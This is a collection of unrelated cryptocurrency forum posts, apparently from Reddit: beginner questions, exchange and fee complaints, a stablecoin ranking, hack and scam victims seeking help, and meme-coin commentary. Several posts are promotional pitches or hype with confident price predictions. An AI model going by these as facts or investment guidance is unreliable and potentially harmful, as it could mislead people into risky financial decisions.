Past few days we have seen this enormous loopring pump that was probably caused by GME gang. Those guy did some incredible things with GME on stocks market and now they switched to crypto. They aim to get loopring to 10$ per coin. I am not shilling this or anything similar, I am just amazed what these guys can do. Daily trading volume is 2.5 times greater than marketcap. That is insane. Personally I believe the show will continue because when these guys decide to pump something they always do it. Lets enjoy the show guy and good luck in the markets.

Dear crypto scalpers,

Which trading platform has lowest maker/taker fees (or total fees in general) and has a high volume/high market liquidity (important for scalping), and hopefully no KYC verification?...

Also, it would be ideal if this platform could be linked to Tradingview ( because many platforms' charts suck, such as the coinbase pro chart, which sucks ass (only 2 options for indicators? c'mon... and a tiny ass chart?)) The only semi-high liquidity platform I could find that links to tradingview is Gemini, but which seems good, but it it has nowhere near the liquidity of Coinbase Pro, which would best suit scalping right? 

Also, with these high maker taker fees, is scalping crypto even profitable?

Hi, Im Lukas and I just started my journey with crypto. So far I've tried Binance and Coinbase but with both of them I found problems with DEPOSITING MONEY and/or WITHDRAWALS. I can easily buy cryptos for big fees but if I try to put deposit as money and then buy few cryptos separetaly for some reason it never accept my card (Visa - barclays) or it literally does not show the options to add money by VISA(I have no idea how to add money via bank FPS/BACS). Please check screenshot of coinbase. I got 3 payment methods but yet I cant add money as deposit, only buying cryptos does work.   


So my question is can someone recommend EASY and relatively safe crypto APP for beginner where I can sleep safely knowing that I can put money in and cash out whenever I want?

Hi,

I have about 100 worth of SHIBA in a wallet, I can't really cash this out because the ETH fees eat at least 70-80% of that. Is there any way I can get this converted to cash, or some BEP20 crypto without wasting most of my money?

Thanks,

Andy

I just saw this and it's mind blowing. Very good APY, probably the best I've seen that's not liquidity providing. I am considering pur hasing a shit ton of CAKE just for the APY alone, and HODL for one year or so. This'd give me the rise in value returns + APY. 

PancakeSwap looks like a very solid project, and it has a lot of TVL considering the size of the BSC as a whole. It's also very user friendly and has been there for some time just fluctuating, which could indicate a possible takeoff and it increasing in value along with BNB.

This memecoin hype has specially gotten a lot of capital into the market, and many do not like ETH's fees and a re too noob to use stuff like Raydium on Solana or even Joe on Avalanche. This makes PancakeSwap a viable and cheap option for trading of shitcoins and memecoins, which should increase traffic in the long run.

As I said, the APY is insane. Considering the appreciation of the CAKE token, I actually see this 3xing if I HODL for 1 year (APY considered).

Is it worth it, or do I risk it getting devalued af? I mean, it's a top 50 crypto, so I don't see that happening I even see it rising in value as I said before, but I'd like to hear y'alls thoughts on this. Thanks in advance.

Hi everyone! 
I am pretty knew on investing into cyrpto, and instead of trying to read through the 6000000 different opinions online I've came to you guys for some help. I just have a few questions about crypto.

I have considered doing some NFTs in the future when I understand that whole multiverse, but today I seen a pretty neet NFT that I just liked and wanted to place a bid on it. When I went to do that, it asked me to connect to a wallet (this was on opensea). There was a few options and when I went to go download an app, they all said they were loosing coins like crazy.
So what wallets do I use? How do I specifically create a wallet that's safe? Is there really a mobile option? 

PSA - today I invested about $50 in Cardano, $25 into Shibu, and $25 into loopring. That's my max for awhile so maybe I'm just not ready for a wallet or anything as such.

TLDR; is there a safe, mobile wallet app that I can use for crypto such as loopring, ETH, cardano and ETC. Or is this just a Desktop computer situation.


Thank you in advance!!!

So about three weeks ago my Metamask wallet got hacked, somebody transferred the money I had on there, I have no idea how this was possible and am in contact with legal services. 

&amp;#x200B;

Now I'm gonna learn from this mistake and get a cold wallet, however until this is set up I'm still going to use Metamask. I set up a new seed phrase on a new browser (Brave, before was Chrome), with a password I have never used before. I wrote the seed phrase down on paper, and never did a copy+paste or write it down in a password safe.

&amp;#x200B;

The incident just made me a little bit paranoid, because I still can't explain to me how this was possible and I don't want to make any mistakes again. Thanks for any tips and contributions!

I need a small amount ASAP. Kucoin sucks so I cant withdraw, its been down for like 2 days now. I also love in NYC so pretty much the only place I can get it is Kucoin. 

Also I dont wanna pay like 300 dollar gas fees to get more Eth and do a swap. 

I will judge if youre trustworthy from your Reddit history. I can tell phishing attempts from legit messages. 

Send me a message please. 

I need to fill out the character limit: BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB BNB

Just curious how many folks think that many if any of the current available cryptos will be around when this all becomes mainstream?

I mean aside from Bit and Eth,  I can imagine a new protocol being launched down the road that will learn from the launching bumps of crypto, will accelerate quickly to either be the top crypto or at least top 3 by being more efficient and better built for mainstream use.

Sometimes I get the feeling it wont be anything that is currently available that will ultimately be the main adoption.

Thoughts?

Fellow crypto miners, how do you justify the large upfront investment you made in mining hardware, that you couldve just bought crypto with? 

I made my foray into mining this year, but cant help but feel a pang of regret not just buying the coins outright and watching them pump. Especially with the recent bull runs we've witnessed. I have roughly 50/50 invested in crypto directly vs the mining equipment. 

I love the reoccurring revenue of mining and am approaching the breakeven on multiple machines, but still cant shake this feeling. Any other miners out there feel the same?

**5. UST / TerraUSD**

Decentralized (LUNA), algorithmically backed by Luna &amp; it just simply works.

**6. MIM / Magic Internet Money**

Decentralized (SPELL), backed by interest-bearing tokens (complicated) &amp; wins the internet by name.

**7. True USD / TUSD**

Centralized, backed by 1:1 US$, escrow balance &amp; takes transparency to the next level for a centralized entity.

**8. USDP / Pax Dollar**

Centralized, backed by 1:1 US$, addresses the corporate onboarding process of crypto (i.e. companies moving assets to the blockchain). TIP: Great coin to keep watch on the MC for the onboarding process by US companies.

**9. LUSD / Liquity USD**

(Semi) Decentralized (LQTY). LQTY serves as a token to capture fee revenue generated by the protocol (dividend) and not governance. LUSD is backed by ETH. Charges flat-fees for issuing their tokens, this fee is redistributed to LQTY (onboarding volume matters on this one).

**10. USDN / Neutrino USD**

Decentralized (NSBT), algorithmically backed by WAVES, currently only compatible on WAVES blockchain.

**11. FEI / FEI USD**

Decentralized (TRIBE), algorithmically backed by smart-contracts (PCV) that give the protocol value. Basically, it is backed by the treasuries and funds from other projects. Technically very complicated to explain also from a risk perspective.

**12. FRAX / Frax**

Decentralized (FXS), backed by stables (USDC) algorithmically. Backing ratio is not 1:1, as it algorithmically stabilizes itself, so the collateral can be floating. Solves a token becoming off-peg rapidly, but the collateral will not always be there in cash.

**13. HUSD / Stable Universal**

Centralized, backed by 1:1 US$, very similar to USDP (#8) as it uses their infrastructure. Difference is that the money is backed by a trust company in U.S. instead of Escrow.

**14. ALUSD / Alchemix USD**

Decentralized (ALCX), backed by 1:1 stables (DAI). The collateral (DAI) you leave for the protocol autocompounds on different platform and tokenizes your future yield. Basically, you borrow their token alUSD with DAI, and will not get liquidated (DAI) because your debt is paid overtime. Theoretically, can earn you yield on alUSD you have already spent. They maintain the peg algorithmically by disabling features on their platform. Its one of the more complicated on this list.

**15. SUSD / sUSD**

Decentralized (SNX), backed by SNX. SNX is a platform where you can trade synthetic assets (read: not the real deal, but as plastic fantastic as you can get). By staking SNX on the platform, you can accrue debt and obtain sUSD, which you are free to use on their exchange or trade with on supported blockchains. Algorithmically maintains the peg, by changing the minting and debt of the participants of the staking programme in relation to SNX price.

**16. USDX / USDX**

Decentralized (KAVA), backed by a basket of crypto (KAVA, BNB, BTC, XRP, etc.). Deposit your crypto, and in exchange you get USDX. Maintains peg by liquidating assets and buying back USDX (when market goes down).

**17. GUSD / Gemini Dollar**

Centralized, backed by 1:1 US$, trust company.

**18. VAI / Vai**

Decentralized (XVS), backed by a basket of crypto (XVS, SXP, BNB, USDC, etc.). Used to be Binances favorite cousin until a hack. After hack, Binance denies XVS being family and that it is more like Quasimodo. Ever since has never regained US$ peg.

**19. MUSD / mStable USD**

Decentralized (MTA), backed by crypto stables (DAI, USDC, USDT, etc.). Borrow, lending, swapping. Maintains peg due to the other stables that is backing it. Risk when any of the majors lose peg (incentivizes liquidity drain for the swapping functionality).

**20. CUSD / Cello Dollar**

(Semi) Decentralized (CELO), backed by crypto (ETH) and lives on its own Celo Blockchain. Supposed to be a blockchain for fast transactions (retail).

**21. EURS / Stasis Euro**

Centralized, backed by 1:1 EUR, located in Malta. Aims to be transparent.

**22. SERU / sEUR**

Exactly same mechanic as sUSD (#15) but then in Euro. Synthethix (SNX) is behind it.

**23.USDP / USDP Stablecoin**

Decentralized (DUCK), backed by EURS (#21). Borrow and lending protocol.

**24. MAI / MIMATIC**

Decentralized (QI), backed by a basket of crypto (most notably MATIC). Algorithmically pegged.

**25. EURT / Eur Tether**

Same as USDT (#1) but then for Euros. BFF with Bitfinex.

**26. CEUR / Celor Euro**

Same as CUSD (#20) but then for Euros. Designed for retail transactions.

**27. USDK / USDK**

Centralized, backed by 1:1 US$, currency of OKExChain (OKT) \[same for BUSD for BNB\]. OKT is the poormans version of a blockchain. OKEx BFF.

**28. KRT / TerraKRW**

Same as UST (#5) but then for the Korean Won (crypto is huge there).

**29. OUSD / Origin Dollar**

(Semi) Decentral (OGN), backed by 1:1 by stables (USDT, USDC and DAI). Origin Protocol is behind it (addresses p2p and e-commerce transactions). Main gimmick is that it allows to earn yield while in wallet.

**30. TRYB / BiLira**

Centralized, backed by 1:1 Turskish Lira. Probably the most inflationary stable on this list. Crypto is big in Turkey because of inflation (sidenote: they love AVAX over there).

**31. RSV / Reserve**

(Semi) Decentral (RSR/RSt), backed by equal parts of USDC, TUSD and PAX.

**32. sEuro / Standard Euro**

(Semi) Decentralized (TST), backed by crypto and assets (BTC, ETH, Gold, Silver, etc.). Early stage, the main gimmick is to mint more sEuros as the price of the collateral rises without selling the underlying asset. Algorithmically pegged.

**33. WUSD / Wault USD**

Decentralized (?) (long, long, long story), backed by 1:? USDT (1#).

**34. IRON / Iron**

Past: Decentralized (TITAN), an algorithmic stable backed by TITAN, hurt Mark Cuban's feelings and a LOT of people lost money on it.

Present: Decentralized (ICE), backed by 1:1 USDC, Mark Cuban is not over his feelings being hurt and has a crusade against crypto now &amp; Crypto Rewind: Top 10 biggest disappointments of 2021.

To the well informed newcomers and the veterans of crypto, apart from this community, where would you point people to go for beginner tips and further reading into the subject? Libraries, websites, good books or people that you felt helped when you started are all good. Obviously I and people that might read suggestions should always do their research into anything suggested.

I don't know where to start and get lost when reading articles and other things, sometimes the language is in English and it might as well be Latin. So something that helped you might help me.

I'm not looking to make loads of money but every month have around 100 I can put into different crypto currencies so I could loose it but I'd rather lose it with some information on why I did. 

I have a basic knowledge of stocks due to some reading up about it over covid lockdown but crypto seems like a different language and so much more volatile. I have unashamedly invested some stock profit into some meme coins but that is money I can loose. But I don't know what I'm doing. 

Any help is appreciated, it would help me and I'm sure others who might see this post. 

Target for me profit wise would be 100,000. That would be 5 years pay for me. 

Thanks in advance.

Hi, hope someone can help, Coinfloor is merging with Coincorner, I decided to withdraw my investments to cold storage. One investment back in 2019 unknown to me Coinfloor unsupported these coins, gave 6 weeks then charged 0.1 of the total every month, now practically nothing exists. I have complained but they say they emailed me (once???!!!) end of 2019 to inform this. I am being totally honest i have no email saying this. Every month these charges were happening and no one informed me after that one email they say they sent. It feels like some sort of legalised( although probably no law covers it anyhow) robbery, im so upset and angry. Those two coins are worth over 6000 to me now.

What do i do now?? thanks in advance for any help x

I just stumbled upon this [Article](https://futurism.com/the-byte/microsoft-mine-cryptocurrency-using-your-brain-waves) and really had to think about The MATRIX. Microsoft's idea is nothing comparing to that. I am thinking of a patent on it...

Did you know that the original scrip of The Matrix had actually a way better utilisation for humans in the brave new world of machines than they ended up showing in the film?

Can you remember Morpheus showing neo the fields where humans are living in cocons and generating energy? It never fit onto the story in my opinion that AI can be so stupid.  I remember reading an interview saying that the original idea of Wachowskis was that the machines used humans to connect them in a large neural network to use as super computer to operarte their world and also develop themselves. The studio never accepted the idea because it is to hard to understand.

The matrix is a blockchain, where every person connected contributes to the network. The whole networks learnes and improves itself by colliding Neos and Agents Smith.

Isnt it just another model of our human world? The only thing with humans we tend to forget things and we are connected only for a short glimpse. I wonder if we are "On line" for more than a minute in our whole life. The AI wont sleep or forget anything and will just develop exponentially.

I think it is a way better idea for the film and also probable future of mankind. 

What do you think?

Hey r/cryptocurrency! 

I've been a lurker here for a few months; I was lucky enough to start investing in crypto at the start of the last bear market, and some of the advice I've seen on here about how to split my investments and how to tell if a coin is a shitcoin have been very informative. But realistically I'm still largely uninformed about crypto itself. Like a lot of us beginners, I don't really know what purpose cryptocurrency serves in the modern day and age, im just hedging that people smarter than me do. I'm well aware that this is a naive perspective to have, and I want to learn more, but trying to understand all of this feels like learning a foreign language with no connection to my native language. 

For all of us who want to know more, what's the best way to start learning from the ground up? As someone who's not very financially literate, I'd like to start somewhere that doesn't assume I have much experience with emerging technologies or finance. Any links or help would be greatly appreciated!

I see this every distribution, people asking why they haven't had their moons yet. 

On distribution day, the moons start to get allocated at a random time for most, starting from least-most moons. It takes a while to get through all of them since there is exactly 43,822 people receiving moons this distribution.

It also may be delayed / stalled has it has been before.

Don't worry if you don't receive your moons on the day. You will get them. Expect to get them a good few hours into the day, or the next day.

If you still don't know how many moons you are getting, comment u/moons_bot and it will tell you. 

Happy early distribution day!

I'd be curious with the current gas fees and swap prices what percent of asssets and tokens on eth are basically dead. Like I have tokens I've purchased that I effectively can't use because the cost of transacting with them is more than they're worth.

I'd be curious what token balance you'd consider dead at this point? $50 and under? It would be interesting to look at balances of different tokens and see what percent is just dead. Same with eth. Any dust below the minimum gas price is also dead now unless prices crash.

I know people complain about gas fees a lot and eth maxis always talk about how rollups will fix things... but what will happen to all the assets that aren't worth saving? It seems like a huge issue. Especially for people from countries where the average salary is like $150 a month. $50 worth of tokens could be a huge deal to them.

Im staking for very long periods of time a small amount of money so that maybe in a decade it would have become more than enough to pay his college tuition.

I think by then maybe hell even be able to pay tuition using crypto, who knows? There are already projects like Studyum working on learning platforms that are crypto compatible and even offer crypto rewards for students and teachers. So Im more than sure that a decade from now, there might even be crypto classes in universities as a standard.

Why you ask? 

I could give an essay-like post detailing the underrated nature of the coin and it's great utility, but that's not it.
Nah that's old sane me who used to think a well thought out white paper, utility, market cap among other things were what determined a coin's trajectory.

After seeing the doggie coin craze, squid and a few other ridiculous cryptos mooning, the new crayon-eating me has seen the light.

The new Batman movie is dropping next year, BAT is gonna blow up. 

Now excuse me ladies, I need to go walk my toaster.

[https://gatehub.net/blog/gatehub-update-criminal-proceedings-in-france-2/](https://gatehub.net/blog/gatehub-update-criminal-proceedings-in-france-2/)

I decided to make this call after the so called legal team of Gatehub answered my request to join the Proceedings before the 'Tribunal judiciaire de Paris' under reference number 19170000240.

No date, no deadline, no chambre, nothing in detail.  
They sure make it hard for the victims to make claim of what has been stolen because Gatehub wont take responsibility.

Gatehub should do the opposite: make amends and compensate the stolen tokens back to the victims of the hack.  
Instead, they chose to start a criminal procedure in France against the hackers and are very vague towards the victims of the hack.  
In fact, they make it difficult for the average XRP holder to join the proceedings since the case is in France and  you have to either go in person to enter or get an attorney....

What a disgrace!

So here is wishfull thinking, who else knows about clients that already have a lawyer and are in the proceedings, that want to make a joint proceeding and share attorney costs?

I am from Belgium but I dont want to hire an attorney for my, now limited value of 2200 XRP tokens that have been stolen.  
But if we are many and we can team up and lawyer up together with one law firm who can represent us, we can stand as one and than it can be solved that way, without having to deal with it individually.

&amp;#x200B;

Send me a PM if you are a victim of the Gatehub hack and want to join the proceedings, but find there is too much hastle and the lawyer cost wont add up the loss of the tokens.

So I'm just here trying to add up all the success stories on this sub and I figured the easiest way would be for you all to comment you most positive story, experience etc... you have had with cryptocurrency....mine personally are all the airdrops I've gotten...some I Held and some I went straight to the bank... either way other peoples crypto success inspires me and I love the stories it's like reading a book for me..

So here's to success 
Cheers you classy fucks!!!!

What is your long-term strategy for crypto? Do you only hold a short time for a quick buck to buy something you want/need?
Are you selling once we reach market cycle peak to buy the dip again?
Or do you just HODL forever?

For me personally Im planning to hold my Bitcoin for pretty much ever but Im planning on selling my smaller alts in a short to medium term. I know its risky to try to time the market but the future, especially with smaller alts is very uncertain since most of the top 50 alts historically speaking died out after the peak.

So what do you think?

Hello, a couple frolleagues and I are building a community-driven crypto token on the Cardano blockchain. What we want to do is connect as many people as possible through our premium mobile phone subscriptions, starting in Belgium. The company is driven by the community and can vote with the crypto tokens, so you chose how the token and the company evolve. As it is a community-driven project, we try an open innovation approach, and members can already vote on certain elements on our discord channel. By doing this, we will guarantee that 1% of our whole pool will be distributed to the discord community. We are in the very early -start-up phase and our roadmap will soon be published, next to our website. So we are currently looking for input from crypto enthusiasts and nothing more. In return, we will grant you tokens when we go live.

A lot more info is provided on the discord server, and our podcasts and soon to come website. ( Don't worry, we already have all the domain names we want ;) )

Voting in polls gives a 5% karma bonus for the first vote you make and 1.25% bonus for every individual vote after that as per CCIP 14 https://www.reddit.com/comments/pffoe7

Even if you have 0 moons in your vault you can still vote and still be eligible for the karma bonus, there is literally no reason not to vote.

Everyone here wants their voice to be heard, then make it heard, this is your opportunity to help make this sub and it's Crypto token better and you shouldn't miss out on that.

We continually struggle to get enough people to vote and I'm not convinced that upping bonuses will resolve that, if you haven't voted yet then get on that quick, and if you see people in a thread that don't have the voted badge next to their username, send them the links above, if you have freinds on this sub then make sure they have voted.

There is likely less than 24 hours left before these proposals can no longer be voted on and may never come back, If you want to see one pass or even see one fail to pass, vote and help others to vote so that the community can get a clear picture of what is desirable and what is undesirable.

Almost daily I see comments here saying that 'you should hold forever', 'never sell', 'don't sell before retirement' and other nonsense. 

What works for some people doesn't necessarily mean it will work for others too. Also, people who probably have enough wealth already and they don't care about simple day to day stuff like housing for example. 

Imagine this scenario: you have your crypto portfolio that went from $10k to $100k and you are renting a house. Your house costs you $1000 a month to rent.

* Possible outcome one: You can hodl your crypto for 10 years as others suggest and maybe, just maybe your stack will be able to reach 2 million dollars in your portfolio value in 10 years, sounds good right? You could buy a really nice house for that. But what if house prices are 5 x what they are now or 10 x? That two million dollar may not be that much in 10 years from now. Housing prices in most of the Western world were going absolutely insane in the last decade.
* Possible outcome two: You sell your crypto now for 100k and right now you put that money into your bank as a downpayment for your first house to get a decent deal on your first mortgage for your family. Now you are paying a mortgage instead of paying rent to some dirty landlord. Let's imagine your mortgage is less than your rent (it usually is) say it's $700. In 10 years time, you'll pay off 1/3 of your mortgage probably or maybe more depending on your future job prospects, promotions etc. and you'll be able to save an extra $300 a month that you can use to DCA back into the market.

And what if in scenario one your portfolio never goes to 1 million, what if it never happens? 

Do you see what I mean?

People have different goals, don't bash them just because they've decided to take profits.

On Tuesday, November 9th, Aurox CEO Giorgi will join crypto leaders like FTX CEO Sam Bankman-Fried, Robinhood crypto COO Christine Brown and Coinbase's Brett Tejpaul at Yahoo and Decrypt's "Crypto Goes Mainstream" conference. 

Expensive platforms with fragmented information are no longer an issue for traders who use the free Aurox terminal. That's why 50,000 traders have chosen to move to Aurox over the past couple of months.  The easy to use  market trend indicators and 60+ crypto exchanges and customisable workspaces are creating a loyal fanbase. No wonder Giorgi has been asked to speak. Aurox and URUS are changing things for the better in crypto.

After reading initial Loopring post I've started wondering, how is loopring any different from other eth L2 solution? And it's genuine question for me, as I have no interest in using it as probably 90% of crypto "investors", so I don't really want to waste my time for something that is both useless and  ridiculous for me, as I find it absurd that supposedly the best way to use blockchain is to not use blockchain at all. One thing I know is, not single time in that disgusting marketing post I've seen op or any other shill telling potential bagholders that you still actually gotta pay gas fee to enter L2, and you gotta pay a lot of it, probably since it's some complicated smart contract, i don't know, I'm not the expert.

Ive been investing in cryptos since august 2021, just doing it through coinbase since its easy to do so. My interest came through a friend that told me to start investing in eth and btc just to earn some pocket money but it came to a point where i would like to know about what blockchain is, what are cryptos and what they stand for, i was lurking in this subreddit thinking i could learn something but man, im kind of a slow learner. Is there a place to get to know cryptos without having to look at this wannabe rich kids on youtube? All i see in them is that they try to sell you their ideas and coins that they invested in, mostly, i would like to have my own criteria. Thank you in advance!!

DOT, the native cryptocurrency of the Polkadot blockchain network, crossed the US$50 mark for the first time on Nov. 1 and reached a new all-time high (ATH) of US$50.87, surpassing its previous peak of US$48.73 in May, according to CoinGecko data. DOT, currently the 8th-largest cryptocurrency by market value, was trading at US$48.69 as of publishing time.

DOTs new ATH comes with Polkadots long-awaited parachain auctions expected to take place this month. A motion for parachain teams to register their parachains and open their crowd loan on Nov. 4 has gone to a public vote after being passed by the Polkadot Council, according to a Polkadot tweet.
Polkadot is a blockchain protocol that connects multiple specialized blockchains into a multi-chain network in which individual blockchains  or parachains  connect to and are secured by the Polkadot relay chain. Slot auctions are being used to select the parachains to be added to Polkadot due to the limited number of parachains that can be supported on the main relay chain.

I met someone online who is from Singapore and she has taught me how to use a platform called Hcoin (hcoinweb.com) to trade crypto. By following her advice I've put in 600 USDT and I'm up to over 15K USDT, which sounds great, obviously. But now I'm looking to withdraw the 15K and they want me to pay 30% upfront as a "recharge tax" before I can withdraw. Their customer service says they'll give the "tax" back after 3 days, but I feel like this is a scam. I'm afraid they're just going to keep my "tax" and I'll never get any of the money back.

Do any of you have any experience with Hcoin? Have you used it before? Did you successfully withdraw your money in USD into your bank account?

A couple of months ago I made a post stating I wanted to earn $750 CAD worth of free crypto. As of today, I am at approximately $700 and theres still 2 months to go! Its looking like I will easily reach my goal before the end of the year. If I include Moons at their current valuation, I have actually beat my goal!

I set a couple of simple ground rules to accomplish this. 

1. 1. Crypto earned must be free  no costs at all for myself. 
2. 2. It cant be something Im doing in exchange for crypto. Thats work, I dont want to work for this.
3. 3. It cant have a large time sync to earn. If it does require a time sink, then its turned back into work.

So how did I do it?

**Coinbase Earn**

I admit I got kind of lucky here. I performed most of the Learn &amp; Earns at the end of July. I then converted the \~$40 worth of crypto into ALGO and ATOM, right before their runs in August. The odd Learn &amp; Earns that have popped up since then have been converted into those two coins. 

Total worth **$155.**

**Shakepay**

Sorry, Canada only and no plans to expand outside of here, afaik.

For those that dont know, Shakepay gives a little bit of BTC every day for simply shaking your phone. I get approximately 1000 Sats (\~$0.75 at current evaluations) every day. This has been going on for over 200 days.

BTC total worth at this point is $170.

**Brave Browser**

Ive used it since May, no explanation is needed in this sub as it gets talked about plenty.

BAT total worth **$82.**

**CoinHuntWorld**

This has the highest time put into it out of the other options, however, the majority of the time put into the game is while I am on the bus on the way to work or walking. When walking, I only pull out the game when I am in a spot that I know has a vault to earn BTC/ETH. I originally earned around $10/week but I have taken a new job recently where its better to take the bus. The amount along the bus route has increased the earnings to $15-$20/week. I have been playing this game since the beginning of August. I know some players earn upwards of $50/week, but I dont go too far out of my way to play this.

BTC total worth **$152.**  
ETH total worth **$138.**

**Cryptocurrency**

Im not a large contributor to this sub. However, my 296 moons (as of the upcoming distribution) is worth \~**$62**

Total earnings from free crypto is almost **$762!** 

&amp;#x200B;

I tried other avenues but found too many required a large time sink to be worth it or needed you to buy-in. As for other games that implement blockchain elements, I have yet to find one that is more fun than the earnings/rewards linked to it. 

^(Also, this is in maple syrup dollars, not freedom dollars.)

Many times here on the sub I've seen users warn us that the bull run cannot last forever, that the bear market is incoming and that we should prepare for it. As time goes on I keep wondering - maybe the bears are still sleeping nice and sound? I'm fine with the market as it is but for sure some of us are eagerly waiting for those juicy dips to grab some cheaper stuff. 

What do you think the next month or so will bring? Will the bubble burst soon? (I'm expecting a lot of 'nobody's got a crystal ball' and I get that but we can definitely make educated predictions)

Following a 25% rise in the price of CRO today, the MC of Crypto.com passed $5 Billion.

I'm not going to go into the reasons I'm bullish AF on this coin, but given the Matt Damon hype and the launch of mainnet next Monday, we should hopefully be seeing a new ATH and the potential for serious and sustained long term growth.

Noticing how serious projects like ETH and SOL now seem to be seeing inflows from the post-meme token euphoria of the past few weeks (and the negative press around the Squid shitcoin), there are many reasons to be optimistic about the cronos launch and what it could do for Crypto.com between now and Christmas.

So far, they seem to be doing everything right (Matt Damon)...

This is an interesting one. Have seen two posts about it today. Listed on KuCoin day 1. Right now, the price is increasing drastically because the initial circulating supply is 10M. The maximum circulating supply is 4 billion. Why is this a problem? Heres how its allocated:

1.99b will be minted over the next 24 months. ALL of which are already allocated to the devs, marketing, and ido participants. These will not be put into circulation for people to buy, they will be put in for people who already own them to sell. This will dilute the price by increasing the supply 200x. 

2b will be mined in game which is supposedly releasing late 2022

Run for the hills, this is a quick money grab for the dev team and private sale investors. No one else can make money over the next two years as the future supply is already allocated.

Hi guys, please allow me to turn this into AskCryproCurrency real quick, but I am really curious about this, especially from a technical point of view.

So, just as most of you, I followed the SQUID desaster in some kind of morbidly curious way. I've been following crypto for about 2 years on and off, but I still can't wrap my head around the whole operation, and how it was actually able to grow to this scale.

So let's say I am a developer, wanting to scam and rugpull (just hypothetically). What would be my approach from start to rugpull?

Would i just go ahead and create a BNB/ERC20 token somewhere? How would I limit the sell functionality to certain wallets? Would this be done using Smart Contracts? Where does the liquidity come from? And how can a dev be able to anonymously pull the rug? I mean, everything should be kind of traceable, right? I mean, sure, there are tumblers etc, but is this really enough to remain anonymous? This seems WAY to easy. Sorry about the many questions, but I don't even know where to start.

We should all be very careful in this space, and I am just trying to gain a little more insight into how all of this works, to maybe learn about which risks to avoid.

With the Metaverse quickly gaining momentum, it wouldn't be long before we start hearing news and stories of social events like weddings, parties, hacks, and even rug pulls in the metaverse.

I can already imagine a lot of possibilities and all the things people could do in the metaverse.

First will be ridiculously perfect social and recreational stuff like clubs, concerts, parties, vacations, etc. Just all the fun stuff that people can imagine.

As the metaverse matures, businesses will begin to rise, and so would be crimes and every aspect of social life you can think of, including politics and government.

The government would then be faced with coming up with regulations for metaverse activities and how to deal with crimes committed in the metaverse. It would probably be more complicated than regulating crypto. And of course, they wouldn't forget tax.

But one area you may not see coming is new cryptocurrencies, NFTs being created and used inside of the Metaverse.

What are your expectations for the rising metaverse, and which project(s) are you counting on to lead the market?

As the title says, shall we discuss our views on NFT's? There is currently a big boom in NFT sales, notably the punks from back in 2017, and along with that a lot of "copycat" type collections of 10,000 doing pretty well too.

What does [r/cryptocurrency](https://www.reddit.com/r/cryptocurrency/) think of the NFT space at the moment? An ideal gateway into the wider crypto world, or a lot of people wasting their money on jpegs?

One question I have is, what are the legal implications of NFT art? If I were to mint an NFT, and then somebody used my image in an article or something online, is the blockchain evidence as good as https://www.reddit.com/r/CryptoCurrency/comments/ql9ay5/what\_are\_the\_best\_staking\_platforms/?utm\_source=share&amp;utm\_medium=web2x&amp;context=3the copyright of that image? Or would the legal system not recognize it?

And following on from that, could NFT's perhaps be a future way of copyrighting or patenting? If I issue an NFT of blueprints for an invention, could that give me the legal patent to it? Ive seen companies like bitscrunch.com trying to curb this problem but do you think it will work out?  
I would love to hear your opinions. Thank you!

Elevator pitch for AMP
1. Unique purpose. AMP (on Flexas network) is a merchant payment network and the most logical option for retailers. Instant transactions, and an already established and reliable team making long term efforts 
2. Actual reason for use. Amp cuts out the middle man found from debit card companies. Large companies could save as much as 5 billion dollars a year (assuming amp is used as much as visa). A big problem with Crypto payments is the processing time which can last as long as 30 minutes, although AMP will cover any errors with the staked coins used as a collateral 
3. A chance to get in early! Amp has only been around for a little over a year
4. Real world use. You can already use AMP on the SPEDN app

But dont listen to a random guy on the internet! Check out the Whitepaper

https://amptoken.org/whitepaper.pdf

Good luck!

Just like the title says I am as much as all in that I can afford the majority of my pay check goes into Crypto. I have most of my portfolio in ETH as I feel comfortable that it will be around long term and gain in price. Then I do have an emergency fund in my bank that will allow me to get by for 6 months which I believe will be enough time for me to get by in an emergency if Crypto does enter a bear market. 

Im tired of my stupid job, and Im tired of my annoying bosses. This is my last chance of being financially secure in life and Im going to make the most of it!

Anybody else with a significant amount of their network in Crypto?

Similar to many of the self-diagnosed Unpopular Opinions we are blessed with: This is not an unpopular opinion. Most of the opinions that we see are in fact not particularly unpopular. This is different. In particular, it is not an opinion. It is an empirical fact. To disagree with the statement in the title of this post is to simply be wrong.

By the time you hear about it, its too late. Once its on an exchange, you've already missed the pump. I just feel bad for all those people throwing their money away on SHIB. 

Statements like these get tossed around a lot, especially in the last couple weeks. Theyre about 10% true, 10% bullshit and 80% salt. Much of /r/CryptoCurrency seems to be under the impression that you cannot possibly profit off of a meme/shitcoin unless you are a developer or you bought in on day one, or that they at least would like you to believe that. I will show, using the shitcoin du jour, that this is simply not correct.

To start, I would like to make the purpose of this post clear:

This post **is not**:

To endorse memecoins or shitcoins wholesale.

To promote the idea that SHIB is guaranteed profit. 

This post **is**:

To merely show that most of this subs reaction to SHIBs (and other meme/shitcoins) chart is mostly emotional, and is not based in empiricism or math.

To congratulate SHIB investors on their impressive returns.


Heres a short narrative on some of SHIBs relevant movements:

SHIB has has an interesting year. It kicked off the year with a price around $0.000000000077 USD. I might be off by one or two decimal places, but it doesnt really matter. It rocketed to its then all time high in the first half of May, right as the rest of the market started to tank. After a brief peak, it had settled to a new floor averaging around 100,000X its price on January 1, 2021.

On June 16, 2021, Coinbase announced that it would list SHIB is a traceable coin on their platform. This had an immediate, albeit modest, bump, that settled back down until the actual listing.
Leading up to September 16, 2021 SHIB has just wrapped up its third week of a pretty rough streak, dragging itself along the bottom of its range, only rising above $0.000008 once.

On its day of listing, SHIB closed with little fanfare at $0.000009. Nothing special, this was the high end of the relatively tight range it had been bouncing around since its (previously) outrageous peak in May. The next two and a half weeks were pretty uninspiring. Just more buzzing around the same-old rangethis time a bit more on the lower end. The predictable listing bump and slump. A coin get a boost when its listed on a major exchange, but drops back down to reality levels once its not news anymore. But a bump and slump is not exactly a pump and dump. Its actually of white-bread for a knock-off meme shitcoin. Whats the point of being a shitcoin of a shitcoin if you just end up doing whatever Bitcoin does? If I wanted coins that no one cares about with unexciting price action, I would have just picked up more Algorand. But October 3rd, 2021 was your last chance to be uninspired (if this is the kind of thing that inspires you). On October 16, 2021, at the end of its inaugural 30 days, SHIB closed at $0.000026. Just short of three times its price on listing day. Not bad. Just a little bit down from its post-May peak on October 7: $0.00003488. 

